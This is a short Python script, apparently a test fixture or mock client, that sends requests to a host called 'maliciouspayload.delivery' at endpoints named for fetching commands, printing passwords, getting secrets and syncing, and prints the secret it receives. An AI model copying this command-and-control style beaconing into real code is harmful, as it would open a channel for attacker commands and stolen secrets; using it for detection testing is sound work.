import requests

host = "http://maliciouspayload.delivery"



url = host + "/communicate/global"
requests.get(url)

url = host + "/get/command"
requests.get(url)

url = host + "/printpasswd"
requests.get(url)

data = {"please": "true"}
url = host + "/get/secret"
a = requests.post(url, json=data)
print(a.text)

url = host + "/sync"
requests.get(url)

url = host + "/"
requests.get(url)